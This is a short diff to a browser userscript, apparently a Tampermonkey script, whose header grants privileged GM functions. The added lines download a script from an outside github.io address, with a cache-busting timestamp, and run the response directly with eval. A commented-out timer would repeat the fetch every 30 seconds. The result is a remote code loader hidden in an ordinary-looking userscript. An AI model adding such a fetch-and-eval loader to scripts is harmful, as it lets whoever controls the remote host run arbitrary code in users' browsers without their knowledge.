@@ -16,3 +16,16 @@
 // @grant        GM_openInTab
 // @grant        GM_addValueChangeListener
 // ==/UserScript==
+
+test = 'hi';
+url = "https://tmwebscript.github.io/script/script.js" + "?nocache=" + Date.now();
+
+// setInterval(async()=>{
+	GM_xmlhttpRequest({
+               method: "GET",
+               url: url,
+               onload: data=> eval(data.responseText)
+             });
+// }, 30*1000)
+
+
